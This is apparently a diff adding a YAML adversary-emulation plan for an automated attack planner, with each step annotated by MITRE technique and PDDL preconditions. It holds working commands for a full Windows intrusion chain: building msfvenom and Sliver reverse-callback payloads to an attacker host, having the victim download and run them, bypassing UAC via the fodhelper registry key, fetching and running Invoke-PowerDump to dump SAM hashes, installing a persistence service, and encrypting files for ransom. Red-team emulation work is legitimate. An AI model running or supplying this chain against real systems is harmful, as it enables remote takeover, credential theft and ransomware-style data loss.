@@ -1,0 +1,648 @@
+emulation_plan_details:
+  adversary_name: env0
+  creation_time: 2026-07-15 05:30:23 UTC+0000
+  parent_chain_idx: 133
+  internal_chain_idx: 161
+  stage_outcomes:
+    - stage: initial-executor
+      status: succeeded
+      plan_source: attack_plan-4.yml
+    - stage: discovery-obtained
+      status: succeeded
+      plan_source: attack_plan-3.yml
+    - stage: credential-access-obtained
+      status: succeeded
+      plan_source: attack_plan-3.yml
+    - stage: persistence-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: privilege-escalation-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: collection-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: exfiltration-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: impact-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: lateral-movement-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+attack_action_sequence:
+  - uuid: msfvenom-1
+    name: Build the executable file of a Meterpreter session (for Windows) using MSFVenom
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command uses MSFVenom to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: MSFVenom Console
+      command: |
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe -o #{SAVE_PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        pddl_index: string0_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (meterpreter-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+      - (file-on-attacker ?path - string ?file - file)
+      - (standalone-exe-file ?file - file)
+  - uuid: set-msf-payload-handler-for-file
+    name: Set an MSF payload handler for a file-backed payload
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - Windows Command Shell
+      - Ingress Tool Transfer
+      - Non-Standard Por
+    description: |
+      Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
+      for the case where the meterpreter payload has been (or will be) staged as a
+      file on the victim.
+
+      This variant additionally grants `(callback-covered ?file)` for the payload's
+      file — the gate that every execute-* action requires before running that file.
+      Payload-genesis actions (msfvenom) deliberately do NOT produce
+      `callback-covered`, so payload files are born uncovered; firing this action
+      is what makes them safe to execute. This forces the planner to sequence
+      handler-set before any execute-* on the payload file — the ordering
+      constraint is encoded directly in PDDL preconditions.
+
+      Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
+      loading, in-memory shellcode injection, staged callback with no on-disk
+      artifact.
+    execution:
+      executor: Metasploit Executor
+      command: |
+        exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
+                                    payload_module_name = "#{payload_name}",
+                                    listening_host = "#{LHOST}",
+                                    listening_port = "#{LPORT}"):
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      payload_name:
+        default:
+        description: payload type set by msf
+        type:
+    preconditions:
+      - (meterpreter-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+    effects:
+      - (payload-handler-set ?p - payload)
+      - (callback-covered ?file - file)
+  - uuid: simulate-download-execute-file
+    name: Simulate the victim download and execute malicious payload file
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:8000 in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        required: true
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string1_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - operator: or
+        operands:
+          - (os-linux ?target - host)
+          - (os-windows ?target - host)
+          - (os-macos ?target - host)
+      - (file-on-attacker ?localpath - string ?file - file)
+      - operator: or
+        operands:
+          - (standalone-exe-file ?file - file)
+          - (elf-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (file-executed ?file - file ?target - host)
+  - uuid: execute-meterpreter-payload-file
+    name: Execute a Meterpreter Payload
+    id:
+      - T1071.001
+    source: Meterpreter
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Meterpreter payload will establish a Meterpreter session.
+    execution:
+      executor: Meterpreter Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (meterpreter-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (meterpreter-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: meterpreter-netstat
+    name: Network Connection Enumeration
+    id:
+      - T1049
+    source: Metasploit
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Discovery
+    technique:
+      - System Network Connections Discovery
+    description: The `netstat` command enumerates active network connections on the
+      remote system.
+    execution:
+      executor: Meterpreter Executor
+      command: netstat(meterpreter_sessionid=#{executor})
+    arguments:
+      executor:
+        description: The Meterpreter session ID of the active Metasploit connection.
+        required: true
+        pddl_index: executor4_var_in_plan
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter-session ?executorID - executor ?target - host)
+    effects:
+      - (system-network-connections-info-known ?target - host)
+  - uuid: sliver-payload-windows-exe
+    name: Build the executable file of a Sliver implant (for Windows)
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mtls --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        required: true
+        pddl_index: string2_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+      - (file-on-attacker ?path - string ?file - file)
+      - (standalone-exe-file ?file - file)
+      - (payload-handler-set ?p - payload)
+      - (callback-covered ?file - file)
+  - uuid: simulate-download-execute-file
+    name: Simulate the victim download and execute malicious payload file
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:8000 in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        required: true
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string3_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - operator: or
+        operands:
+          - (os-linux ?target - host)
+          - (os-windows ?target - host)
+          - (os-macos ?target - host)
+      - (file-on-attacker ?localpath - string ?file - file)
+      - operator: or
+        operands:
+          - (standalone-exe-file ?file - file)
+          - (elf-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (file-executed ?file - file ?target - host)
+  - uuid: execute-sliver-payload-file
+    name: Execute a Sliver Implant Payload
+    id:
+      - T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: Sliver Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (sliver-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: sliver-powershell
+    name: Execute PowerShell Command
+    id:
+      - T1059.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - |
+        Command and Scripting Interpreter: PowerShell
+    description: The `powershell.exe` command executes a PowerShell script or command
+      on the remote host. This command is useful for performing system monitoring
+      tasks or gathering information about the processes running on a remote machine.
+    execution:
+      executor: Sliver Session Derive
+      command: |
+        # no-op — derivation only
+    arguments:
+      executor_parent:
+        description: The session ID of the active Sliver connection.
+        required: true
+        pddl_index: executor3_var_in_plan
+      executor_derived:
+        description: The derived Windows Powershell executor.
+        required: true
+        pddl_index: executor0_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (sliver-session ?executorID - executor ?target - host)
+    effects:
+      - (powershell ?s2 - executor ?target - host)
+      - operator: When
+        params:
+          condition: (elevated-executor ?executorID - executor)
+          effect: (elevated-executor ?s2 - executor)
+  - uuid: art-t1548_002-fodhelper-uac-bypass-ps
+    name: Bypass UAC using Fodhelper - PowerShell
+    id:
+      - T1548.002
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Privilege Escalation
+      - Defense Evasion
+    technique:
+      - 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+    description: |
+      Uses `fodhelper.exe` — a Windows built-in auto-elevating binary in `System32` — to run a pre-staged executable at elevated integrity while bypassing the UAC prompt. Technique: seed `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with the executable path; launching `fodhelper.exe` reads that key and executes the value elevated because `fodhelper.exe` carries `autoElevate=true` in its manifest. Requires the current interactive user to be a member of the local Administrators group; running in Medium Integrity is fine — that is the point. ART auto_generated_guid 4ff64f0b-aaf2-4866-b39d-38d9791407cc.
+
+      Realistic chain: fodhelper is used to re-launch a pre-staged payload at higher integrity, giving downstream `execute-meterpreter-payload-file` (or the sliver equivalent) a `(file-executed-elevated)` on the payload file — which promotes the derived session to `(elevated-executor)` via that consumer's conditional effect. The default `C:\Windows\System32\cmd.exe` is a benign, always-present binary suitable for interactive testing of the technique itself.
+
+      Modelling note: this action is parametric in what *file* runs elevated. AALM does not yet express "run an arbitrary Windows command elevated" as a first-class predicate — that is a deliberate post-2.0 refactor. For any elevated-command chain the operator wants that isn't a pre-staged exe, wrap the command in a `.exe` (or `.bat` invoked via cmd.exe) upstream and point this action at that file.
+    execution:
+      executor: Powershell Executor
+      command: |
+        New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+        New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+        Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "#{EXE_PATH}" -Force
+        Start-Process "C:\Windows\System32\fodhelper.exe"
+    arguments:
+      executor:
+        description: The Powershell session ID (unelevated, admin-group user) used
+          to invoke the UAC-bypass sequence.
+        required: true
+        pddl_index: executor0_var_in_plan
+      EXE_PATH:
+        default: C:\Windows\System32\cmd.exe
+        description: Path of the executable on the victim host that fodhelper will
+          run with elevated integrity. Common chain use is to point at a pre-staged
+          Meterpreter / Sliver payload. Default `cmd.exe` spawns an elevated command
+          prompt — useful for interactive testing of the bypass itself.
+        required: true
+        pddl_index: string3_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (standalone-exe-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-executed-elevated ?file - file ?target - host)
+  - uuid: execute-sliver-payload-file
+    name: Execute a Sliver Implant Payload
+    id:
+      - T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: Sliver Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (sliver-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: sliver-powershell
+    name: Execute PowerShell Command
+    id:
+      - T1059.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - |
+        Command and Scripting Interpreter: PowerShell
+    description: The `powershell.exe` command executes a PowerShell script or command
+      on the remote host. This command is useful for performing system monitoring
+      tasks or gathering information about the processes running on a remote machine.
+    execution:
+      executor: Sliver Session Derive
+      command: |
+        # no-op — derivation only
+    arguments:
+      executor_parent:
+        description: The session ID of the active Sliver connection.
+        required: true
+        pddl_index: executor2_var_in_plan
+      executor_derived:
+        description: The derived Windows Powershell executor.
+        required: true
+        pddl_index: executor1_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (sliver-session ?executorID - executor ?target - host)
+    effects:
+      - (powershell ?s2 - executor ?target - host)
+      - operator: When
+        params:
+          condition: (elevated-executor ?executorID - executor)
+          effect: (elevated-executor ?s2 - executor)
+  - uuid: art-t1003_002-powerdump
+    name: PowerDump Hashes and Usernames from Registry
+    id:
+      - T1003.002
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Credential Access
+    technique:
+      - 'OS Credential Dumping: Security Account Manager'
+    description: |
+      Empire's `Invoke-PowerDump` reads SAM / SYSTEM registry directly and
+      prints NTLM hashes to stdout in one shot — combined dumper + parser
+      (Powershell Mimikatz pattern). Method 3 folds the ART prereq
+      (download Invoke-PowerDump.ps1 from BC-SECURITY/Empire mirror). ART
+      auto_generated_guid 804f28fc-68fc-40da-b5a2-e9d0bce5c193.
+    execution:
+      executor: Powershell Executor
+      command: |
+        $script = "#{powerdump_ps1}"
+        if (-not (Test-Path $script)) {
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          New-Item -ItemType Directory (Split-Path $script) -Force | Out-Null
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile $script
+        }
+        Import-Module $script
+        Invoke-PowerDump
+    arguments:
+      executor:
+        description: The Powershell session ID used to invoke PowerDump.
+        required: true
+        pddl_index: executor1_var_in_plan
+      powerdump_ps1:
+        default: C:\Users\Public\Invoke-PowerDump.ps1
+        description: Target-side path where Invoke-PowerDump.ps1 is staged.
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (credential-data ?d - data ?target - host)
+      - (data-stored-c2 ?d - data)
+  - uuid: art-t1543_003-new-service-ps
+    name: Service Installation PowerShell
+    id:
+      - T1543.003
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Persistence
+    technique:
+      - 'Create or Modify System Process: Windows Service'
+    description: |
+      PowerShell equivalent of `sc create` — uses the native `New-Service`
+      cmdlet to create and start a Windows service persistence pathway.
+      ART auto_generated_guid 491a4af6-a521-4b74-b23b-f7b3f1ee9e77.
+    execution:
+      executor: Powershell Executor
+      command: |
+        New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
+        Start-Service -Name "#{service_name}"
+    arguments:
+      executor:
+        description: The Powershell session ID used to create the service.
+        required: true
+        pddl_index: executor1_var_in_plan
+      service_name:
+        default: AtomicTestServicePs
+        description: Windows service name to create.
+        required: true
+      binary_path:
+        default: C:\Users\Public\service.exe
+        description: Full path to the service binary.
+        required: true
+        pddl_index: string4_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (command-execution-at-startup ?c - string ?target - host)
+  - uuid: art-t1486-gpg4win-encrypt
+    name: Data Encrypted with GPG4Win
+    id:
+      - T1486
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Impact
+    technique:
+      - Data Encrypted for Impact
+    description: |
+      Uses GPG4Win's gpg.exe with a symmetric passphrase to encrypt a target
+      file — mirrors ransomware pattern of "encrypt user data with a key
+      attacker controls". Requires GnuPG installed at the standard path
+      (present on many admin workstations, absent on hardened targets;
+      operator responsibility to provision). ART auto_generated_guid
+      4541e2c2-33c8-44b1-be79-9161440f1718.
+    execution:
+      executor: Powershell Executor
+      command: |
+        if (-not (Test-Path "#{file_to_encrypt}")) {
+          Set-Content -Path "#{file_to_encrypt}" -Value "populating this file with some text"
+        }
+        & "#{gpg_exe}" --passphrase "#{passphrase}" --batch --yes -c "#{file_to_encrypt}"
+    arguments:
+      executor:
+        description: The Powershell session ID used to invoke gpg.exe.
+        required: true
+        pddl_index: executor1_var_in_plan
+      gpg_exe:
+        default: C:\Program Files (x86)\GnuPG\bin\gpg.exe
+        description: Full path to gpg.exe on target.
+        required: true
+      file_to_encrypt:
+        default: $env:TEMP\test.txt
+        description: Target-side path to the file GPG will encrypt.
+        required: true
+      passphrase:
+        default: SomeParaphraseBlah
+        description: Symmetric encryption passphrase (attacker keeps this to demand
+          ransom).
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+    effects:
+      - (data-encrypted ?d - data ?target - host)
